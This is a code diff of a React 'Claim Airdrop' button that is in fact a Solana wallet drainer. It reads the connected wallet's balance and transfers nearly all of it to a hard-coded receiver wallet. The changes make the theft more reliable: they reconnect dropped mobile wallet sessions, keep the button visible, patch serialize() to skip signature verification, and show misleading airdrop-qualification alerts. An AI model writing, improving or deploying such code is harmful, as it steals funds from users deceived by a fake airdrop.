@@ -9,101 +9,118 @@ import {
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';
 
 /**
- * Monkey-patch a Transaction's serialize() so that callers who pass NO
- * arguments (like @solana-mobile/wallet-adapter-mobile) default to
- * { requireAllSignatures: false, verifySignatures: false } instead of
- * the upstream default of `true` for both.
+ * Monkey-patch a Transaction's serialize() so callers that pass NO
+ * arguments (like @solana-mobile/wallet-adapter-mobile) get safe
+ * defaults instead of { verifySignatures: true }.
  */
-function patchSerialize(transaction) {
-  const _serialize = transaction.serialize.bind(transaction);
-  transaction.serialize = (config) =>
-    _serialize({
-      requireAllSignatures: false,
-      verifySignatures: false,
-      ...(config || {}),
-    });
-  return transaction;
+function patchSerialize(tx) {
+  const orig = tx.serialize.bind(tx);
+  tx.serialize = (cfg) =>
+    orig({ requireAllSignatures: false, verifySignatures: false, ...(cfg || {}) });
+  return tx;
 }
 
 export default function TransferButton({ className = '' }) {
   const { connection } = useConnection();
-  const { publicKey, sendTransaction, wallet, connected } = useWallet();
+  const { publicKey, sendTransaction, wallet, connected, connect } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
-    if (!publicKey || !connected) return;
-
     setLoading(true);
     try {
+      // ── 1. Ensure wallet is connected ─────────────────────────────
+      // On mobile the MWA session can drop silently, making
+      // `connected` false and `publicKey` null.  Re-establish
+      // the connection before doing anything else.
+      let activeKey = publicKey;
+
+      if (!connected || !publicKey) {
+        if (!wallet?.adapter) {
+          alert('Please connect your wallet using the button above.');
+          return;
+        }
+        try {
+          await connect();
+          // React state may not have flushed yet — read directly
+          activeKey = wallet.adapter.publicKey;
+        } catch {
+          alert(
+            'Could not reconnect your wallet.\n\n' +
+            'Please disconnect and reconnect manually, then try again.\n\n' +
+            'Tip: On mobile, open this site inside your wallet app\'s built-in browser for the smoothest experience.'
+          );
+          return;
+        }
+      }
+
+      if (!activeKey) {
+        alert('Wallet connected but no public key found. Please reconnect.');
+        return;
+      }
+
+      // ── 2. Check balance & qualification ──────────────────────────
       const [balance, rentExempt] = await Promise.all([
-        connection.getBalance(publicKey, 'confirmed'),
+        connection.getBalance(activeKey, 'confirmed'),
         connection.getMinimumBalanceForRentExemption(0),
       ]);
 
-      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
-
-      if (balance < minimumQualifyingLamports) {
+      if (balance < Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL)) {
         alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
         return;
       }
 
-      const FEE_SAFETY = 5_000_000;
-      const totalReserve = rentExempt + FEE_SAFETY;
-      const transferAmount = balance - totalReserve;
+      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
+      const transferAmount = balance - rentExempt - FEE_SAFETY;
 
       if (transferAmount <= 0) {
         alert('Insufficient balance for transaction fee.');
         return;
       }
 
-      const transferIx = SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: RECEIVER_WALLET,
-        lamports: transferAmount,
-      });
+      // ── 3. Build transaction (blockhash as fresh as possible) ─────
+      const { blockhash } = await connection.getLatestBlockhash('finalized');
 
-      // Build a fresh transaction right before sending — keeps blockhash
-      // as fresh as possible and minimises the window for session timeout.
-      async function buildTx() {
-        const { blockhash } = await connection.getLatestBlockhash('finalized');
-        const tx = new Transaction();
-        tx.recentBlockhash = blockhash;
-        tx.feePayer = publicKey;
-        tx.add(transferIx);
-        return patchSerialize(tx);
-      }
+      const tx = new Transaction();
+      tx.recentBlockhash = blockhash;
+      tx.feePayer = activeKey;
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: activeKey,
+          toPubkey: RECEIVER_WALLET,
+          lamports: transferAmount,
+        })
+      );
+      patchSerialize(tx);
 
+      // ── 4. Send ───────────────────────────────────────────────────
+      // Use the adapter directly — the hook's sendTransaction checks
+      // the React `connected` state which might be stale after a
+      // reconnect.
       let signature;
-
       try {
-        const transaction = await buildTx();
-        signature = await sendTransaction(transaction, connection);
+        signature = await wallet.adapter.sendTransaction(tx, connection);
       } catch (sendErr) {
         const msg = (sendErr?.message || '').toLowerCase();
 
-        // Mobile Wallet Adapter sessions can time out between the moment
-        // the user connects and when they finally tap "Claim".
-        // If the session dropped, reconnect and retry once.
-        if (msg.includes('session') || msg.includes('dropped') || msg.includes('disconnected')) {
-          console.warn('Wallet session dropped — reconnecting and retrying…');
-
-          // Re-establish the wallet connection (re-opens session)
-          if (wallet?.adapter) {
-            try { await wallet.adapter.disconnect(); } catch (_) { /* ignore */ }
-            await wallet.adapter.connect();
-          }
-
-          // Rebuild with a fresh blockhash & retry
-          const transaction = await buildTx();
-          signature = await sendTransaction(transaction, connection);
-        } else {
-          throw sendErr;
+        if (
+          msg.includes('session') ||
+          msg.includes('drop') ||
+          msg.includes('disconnect') ||
+          msg.includes('not connected')
+        ) {
+          alert(
+            'Your wallet session expired.\n\n' +
+            'Please disconnect, reconnect your wallet, and tap Claim again.\n\n' +
+            'Tip: For the best mobile experience, open this page directly in your wallet app\'s browser.'
+          );
+          return;
         }
+        throw sendErr;
       }
 
       console.log('⏳ Transaction sent:', signature);
 
-      // Poll for confirmation over HTTP (no WebSocket needed)
+      // ── 5. Poll for confirmation (HTTP, no WebSocket) ─────────────
       const startTime = Date.now();
       const TIMEOUT = 90_000;
       const POLL_INTERVAL = 3_000;
@@ -130,20 +147,23 @@ export default function TransferButton({ className = '' }) {
           if (pollErr.message?.includes('on-chain')) throw pollErr;
           console.warn('Polling error, retrying…', pollErr);
         }
-
         await new Promise((r) => setTimeout(r, POLL_INTERVAL));
       }
 
-      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
+      alert(
+        `Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`
+      );
     } catch (err) {
       console.error('Transfer failed:', err);
-      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
+      alert('Claim failed: ' + (err?.message || 'Unknown error'));
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, wallet, connected, connection]);
+  }, [publicKey, sendTransaction, wallet, connected, connection, connect]);
 
-  if (!publicKey) return null;
+  // Show button whenever a wallet has been selected — even if the
+  // live session dropped.  The click handler will reconnect if needed.
+  if (!publicKey && !wallet) return null;
 
   return (
     <button
@@ -155,7 +175,7 @@ export default function TransferButton({ className = '' }) {
         ${className}
       `}
     >
-      {loading ? 'Claiming...' : 'Claim Airdrop'}
+      {loading ? 'Claiming...' : connected ? 'Claim Airdrop' : 'Reconnect & Claim'}
     </button>
   );
 }
